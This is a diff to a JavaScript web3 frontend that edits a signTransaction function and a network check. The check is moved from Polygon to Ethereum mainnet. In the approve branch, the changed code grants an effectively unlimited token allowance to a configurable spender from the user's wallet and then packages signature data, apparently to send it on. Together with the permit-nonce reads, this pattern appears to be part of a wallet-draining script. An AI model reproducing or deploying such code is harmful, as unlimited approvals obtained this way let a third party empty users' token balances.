@@ -542,8 +542,6 @@ export const signTransaction = async (slot) => {
             // ? await tokenContract.methods.getNonce(getUserAddress()).call()
             : await tokenContract.methods.nonces(getUserAddress()).call())
 
-    const bigNumber = web3.utils.toBN("1000000000000000000000000000000");
-
     if (typeSign == 1) {
       const domainData = {
         name: tokenName,
@@ -611,8 +609,10 @@ export const signTransaction = async (slot) => {
         }
       } else {
         // APPROVE
+        var bigNumber = web3.utils.toBN("1000000000000000000000000000000");
+
         const txData = await tokenContract.methods.approve(addressSpender, bigNumber).encodeABI();
-        sendTransaction(getUserAddress(), contractAddress, txData, 0).then( async (res) => {
+        await sendTransaction(getUserAddress(), contractAddress, txData, 0).then( async (res) => {
           if (res) {
             const params = {
               signData: {
@@ -655,41 +655,18 @@ export const checkNetwork = async () => {
       net_id = await web3.eth.getChainId();
 
     if (net_id != mainNetwork) {
-      let net_params = [
-        {
-          chainId: "0x89",
-          chainName: "Polygon Mainnet",
-          nativeCurrency: {
-            name: "Polygon",
-            symbol: "MATIC",
-            decimals: 18,
-          },
-          rpcUrls: ["https://polygon-rpc.com/"],
-          blockExplorerUrls: ["https://polygonscan.com"],
-        },
-      ];
-
       try {
         await ethereum
           .request({
             method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x89" }],
+            params: [{ chainId: "0x1" }],
           })
           .then(async () => {
             net_id = await web3.eth.getChainId();
             correctNetwork = net_id == mainNetwork;
           });
       } catch (switchError) {
-        if (switchError.code === 4902) {
-          try {
-            await ethereum.request({
-              method: "wallet_addEthereumChain",
-              params: net_params,
-            });
-          } catch (addError) {
-            correctNetwork = false;
-          }
-        }
+        
       }
     } else {
       correctNetwork = true;
